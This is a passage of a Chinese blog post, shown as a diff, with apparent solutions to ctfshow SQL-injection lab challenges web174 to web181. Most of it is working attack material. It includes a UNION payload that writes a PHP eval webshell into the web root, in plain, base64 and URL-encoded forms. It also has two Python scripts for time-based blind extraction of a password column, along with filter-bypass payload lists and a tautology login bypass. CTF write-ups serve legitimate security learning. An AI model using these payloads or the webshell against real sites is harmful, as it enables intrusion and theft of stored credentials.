class="string">&#x27;pandae&#x27;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;pandaf&#x27;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;pandag&#x27;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;pandah&#x27;</span>,<span class="string">&quot;7&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;pandai&#x27;</span>,<span class="string">&quot;8&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;pandaj&#x27;</span>,<span class="string">&quot;9&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;7b035f01-bcb7-4f71-990c-f1349da885c7&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>此处可知，这里过滤了 ASCII 的0-127字符，所以通过一般的回显就不方便，我们可以使用盲注或者利用读写文件写入网站根目录。</p>
+<h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p> <strong>写入一个webshell使用蚁剑连接，然后读取文件</strong>(这里其实不用编码，但为了以后更方便写入)  </p>
+<p>未处理的sql语句：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,&quot;&lt;?php eval($_POST[panda]);?&gt;&quot; into outfile&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1.</span>php</span><br></pre></td></tr></table></figure></div>
+
+<p><code>&lt;?php eval($_POST[panda]);?&gt;</code>的base64编码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbcGFuZGFdKTs/Pg==</span><br></pre></td></tr></table></figure></div>
+
+<p>的Url编码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%63%47%46%75%5a%47%46%64%4b%54%73%2f%50%67%3d%3d</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%63%47%46%75%5a%47%46%64%4b%54%73%2f%50%67%3d%3d&quot; into outfile&#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>把查询内容写入文件</p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select username, password from ctfshow_user5 into outfile &#x27;/var/www/html/flag.txt&#x27; --+</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h4><p>时间盲注</p>
+<p>抓到拿到接口url，写一个时间盲注的python脚本：</p>
+<h5 id="exp1-慢"><a href="#exp1-慢" class="headerlink" title="exp1(慢):"></a>exp1(慢):</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e0c1c5d-97c9-41b2-a04b-2451568c0b85.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line"><span class="comment">#注意，不是http://7e0c1c5d-97c9-41b2-a04b-2451568c0b85.challenge.ctf.show/select-no-waf-5.php，入口不是这个！！！</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    left = <span class="number">32</span> <span class="comment">#空格</span></span><br><span class="line">    right = <span class="number">127</span> <span class="comment">#最后可见字符</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0) -- -&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url=url + payload, timeout=<span class="number">1.5</span>)</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> left != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(left)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1723001009936.png"
+                      alt="1723001009936"
+                ></p>
+<h5 id="exp2（快）"><a href="#exp2（快）" class="headerlink" title="exp2（快）:"></a>exp2（快）:</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://7e0c1c5d-97c9-41b2-a04b-2451568c0b85.challenge.ctf.show/api/v5.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(flag)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span> - <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span> == j:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;?id=&#x27; union select &#x27;a&#x27;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;flag&#x27;),%d,1))&lt;%d,sleep(0.5),1) -- -&quot;</span> % (</span><br><span class="line">        i, j)</span><br><span class="line"></span><br><span class="line">        start_time = time()</span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url + payload).text</span><br><span class="line"></span><br><span class="line">        end_time = time()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end_time - start_time &gt; <span class="number">0.48</span>:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">min</span> = j</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查询语句</span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure></div>
+
+<p>这道题其实只过滤了个select，而且是强匹配，只用个大小写都能绕过。</p>
+<h5 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h5><p>seLect</p>
+<h5 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h5><p>万能密码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or 1=1--+</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="web177-web179（绕过空格）"><a href="#web177-web179（绕过空格）" class="headerlink" title="web177-web179（绕过空格）"></a>web177-web179（绕过空格）</h3><p><strong>解法</strong>：</p>
+<p><strong>无非就是试试：<code>/\**/</code> <code>%09</code> <code>%0c</code> 等等之类的啦</strong></p>
+<p><strong>还有些时候可以使用（）的方式绕过，详情见后续题</strong></p>
+<p>从我的另一个笔记中copy过来的常用payload ：）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h3 id="web180（限制修饰符）"><a href="#web180（限制修饰符）" class="headerlink" title="web180（限制修饰符）"></a>web180（限制修饰符）</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">or&#x27;1&#x27;=&#x27;1 </span><br><span class="line">或者</span><br><span class="line">||&#x27;1</span><br></pre></td></tr></table></figure></div>
+
+<p>这样来闭合后面的引号</p>
+<p>这题的步骤（可以利用记事本，先写好正常语句，再把空格替换成自己想要的绕过符号如%0c）</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; order by 3 or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>									（我这里<span class="keyword">order</span> <span class="keyword">by</span>没有执行成功，不知道为啥，用下面的<span class="keyword">select</span>一个一个试也行）</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0cdatabase(),2,3%0cor&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>			（这里把database放在第三个会出错,因为第三个不是我们控制的，在这里就只是占个位而已）</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0c1,group_concat(table_name),3%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=&#x27;</span>ctfshow_web</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0c1,group_concat(column_name),3%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_name=&#x27;</span>ctfshow_user</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;union%0cselect%0cgroup_concat(password),2,3%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p><strong>也可以使用 <code>-- </code>(–后加个空格) 绕过。</strong> </p>
+<p>payload</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union%0cselect%0cgroup_concat(password),2,3%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag<span class="string">&#x27;--%0c</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="web181（完全无空格）"><a href="#web181（完全无空格）" class="headerlink" title="web181（完全无空格）"></a>web181（完全无空格）</h3>
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> ctfshow_sql注入解题记录</li>
+        <li><strong>作者:</strong> panda</li>
+        <li><strong>创建于
+                :</strong> 2024-08-08 15:34:18</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-08-08 15:37:23
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://github.com/Pa3da/Pa3da.github.io/2024/08/08/ctfshow_sql注入解题记录/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/08/08/Test/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Test</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">ctfshow_sql注入解题记录</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTFshow-SQL%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="nav-text">CTFshow SQL注入解题记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A5%E9%97%A8"><span class="nav-text">入门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web171"><span class="nav-text">web171</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#union-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-text">union 联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web172"><span class="nav-text">web172</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web173"><span class="nav-text">web173</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web174%EF%BC%88%E9%99%90%E5%88%B6%E6%95%B0%E5%AD%97-replace%EF%BC%89"><span class="nav-text">web174（限制数字-replace）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web175"><span class="nav-text">web175</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web176"><span class="nav-text">web176</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web177-web179%EF%BC%88%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%EF%BC%89"><span class="nav-text">web177-web179（绕过空格）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web180%EF%BC%88%E9%99%90%E5%88%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6%EF%BC%89"><span class="nav-text">web180（限制修饰符）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web181%EF%BC%88%E5%AE%8C%E5%85%A8%E6%97%A0%E7%A9%BA%E6%A0%BC%EF%BC%89"><span class="nav-text">web181（完全无空格）</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">panda</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共 3 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
